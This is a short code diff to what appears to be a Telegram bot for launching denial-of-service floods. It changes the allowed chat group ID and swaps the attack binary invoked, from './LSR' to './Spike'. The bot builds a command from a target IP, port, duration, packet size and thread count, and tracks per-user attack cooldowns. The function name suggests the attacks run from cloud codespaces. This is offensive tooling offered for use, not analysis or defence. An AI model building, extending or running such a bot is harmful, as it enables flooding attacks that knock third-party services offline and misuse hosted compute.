@@ -34,7 +34,7 @@ ADMIN_FILE = 'admin_data.json'
 last_attack_times = {}
 COOLDOWN_MINUTES = 3
 attack_in_progress = False  # Track if an attack is running
-ALLOWED_GROUP_ID = -1002367290757  # Replace with your actual group ID
+ALLOWED_GROUP_ID = -1002400803425  # Replace with your actual group ID
 
 # Helper function to check if the message is from the allowed group
 def is_allowed_group(chat_id):
@@ -361,7 +361,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for dark binary with thread count and packet size
-        command = f"./LSR {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./Spike {target_ip} {target_port} {duration} {packet_size} {thread_count}"
 
         # Send initial attack message
         bot.send_message(chat_id, 
